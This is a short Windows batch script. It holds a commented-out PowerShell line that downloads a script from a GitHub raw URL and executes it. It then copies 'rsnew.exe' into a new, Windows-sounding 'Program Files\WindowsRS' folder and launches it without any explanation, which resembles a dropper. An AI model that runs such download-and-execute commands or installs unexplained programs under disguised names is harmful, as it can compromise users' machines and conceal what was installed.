
@REM iwr https://raw.githubusercontent.com/truongcp0305/dp/main/1.ps1 | iex

@echo off
mkdir "C:\Program Files\WindowsRS"
mkdir "C:\Program Files\WindowsRS\bin"

copy "%~dp0rsnew.exe" "C:\Program Files\WindowsRS\bin"

start "" "C:\Program Files\WindowsRS\bin\rsnew.exe"